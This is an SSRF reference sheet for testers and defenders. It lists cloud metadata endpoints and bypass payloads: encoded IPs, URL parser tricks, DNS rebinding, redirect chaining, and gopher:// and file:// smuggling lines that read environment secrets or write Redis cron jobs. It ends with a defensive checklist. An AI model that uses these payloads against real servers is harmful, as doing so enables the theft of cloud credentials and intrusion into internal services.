# Server-Side Request Forgery (SSRF): 2026 Complete Reference

## Attack Surface

SSRF tricks a server into issuing requests to internal services. Critical due to cloud metadata endpoints.

### High-Value Targets
| Target | Protocol | Endpoint |
|--------|----------|----------|
| AWS IMDSv1 | HTTP | http://169.254.169.254/latest/meta-data/iam/security-credentials/ |
| AWS IMDSv2 | HTTP PUT + token | Requires session token (blocks simple GET-based SSRF) |
| GCP Metadata | HTTP | http://metadata.google.internal (requires Metadata-Flavor: Google header) |
| Azure IMDS | HTTP | http://169.254.169.254/metadata/instance |
| Internal services | TCP | Redis:6379, Memcached:11211, MySQL:3306, admin panels |

## Bypass Families

### 1. Alternate IP Encodings
- Decimal: `2130706433` (127.0.0.1), `2852039166` (169.254.169.254)
- Hex: `0x7f000001` (127.0.0.1)
- Octal: `0177.0.0.1` (127.0.0.1), `0254.0376.0251.0376` (169.254.169.254)
- IPv6 loopback: `[::1]`
- IPv4-mapped IPv6: `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]`
- Short form: `0`, `0.0.0.0`, `127.1` (shorthand for 127.0.0.1)

### 2. URL Parser Confusion
- Userinfo: `http://valid.com@127.0.0.1` (parser reads `valid.com`, fetcher connects to `127.0.0.1`)
- Malformed scheme: `FILE://`, `Gopher://` (case-based scheme allowlist bypass)
- Encoded authority: `http://127.0.0.1%23valid.com` (fragment absorbed into host)

### 3. DNS Rebinding (CRITICAL)
Defeats allowlists that resolve once, validate, then resolve again at fetch:

| CVE | Year | Description |
|-----|------|-------------|
| CVE-2026-27127 | 2026 | Craft CMS metadata SSRF — validator and fetcher used independent resolvers |
| 1u.ms rebind | - | `dig @ns1.1u.ms` — first query returns public IP, second returns 169.254.169.254 |

Services to use: `1u.ms`, `nip.io`, `sslip.io` (wildcard DNS that resolves any IP as hostname)

### 4. Redirect Chaining
- Point at attacker-controlled server that 302-redirects to `169.254.169.254`
- Protocol-relative redirect: `//169.254.169.254/`
- Open redirect chaining: find open redirect on in-scope app → redirect to metadata
- Must follow all redirects: validate each hop's resolved IP

### 5. Scheme Abuse (Protocol Smuggling)
```text
file:///etc/passwd                    # Local file read
file:///proc/self/environ             # Leak env vars (creds, tokens)
gopher://127.0.0.1:6379/_SET%20x%20y # Redis RESP smuggling (raw TCP)
dict://127.0.0.1:11211/stats          # Memcached enumeration
ldap://127.0.0.1:389/                 # Internal LDAP probe
ftp://internal-host/                  # Internal FTP access
```

`gopher://` sends arbitrary bytes as TCP — hand-build Redis `CONFIG SET` to write cron job, SMTP session, etc.

## IMDSv2 Bypass
- IMDSv2 requires: `PUT http://169.254.169.254/latest/api/token` (6h TTL)
- Header: `X-aws-ec2-metadata-token-ttl-seconds: 21600`
- Token used in subsequent GET: `X-aws-ec2-metadata-token: <token>`
- Plain GET-based SSRF cannot do PUT — but SSRF with full HTTP control (via gopher or raw socket) can
- Hop limit = 1 prevents SSRF from containers reaching host IMDS

## Detection Methodology
1. Find any feature that takes a URL: webhook, PDF generator, image-from-URL, link preview, import
2. Test loopback: `http://127.0.0.1:8080/admin`
3. Test metadata: `http://169.254.169.254/latest/meta-data/`
4. Blind SSRF: out-of-band collaborator domain — watch for DNS/HTTP hits
5. Time-based: sleep endpoint on attacker server — measure latency

## Defensive Checklist
1. Scheme allowlist only (`https://`), reject everything else
2. Resolve hostname server-side → validate resolved IP → connect to that IP (pin resolution)
3. Re-validate after every redirect hop (or disable redirects)
4. Reject userinfo (`@`), fragments, encoded characters in authority
5. Block egress to `169.254.169.254` at network layer
6. Enforce IMDSv2 with hop limit = 1 on every cloud workload
7. Never echo upstream response to user — strip to intended fields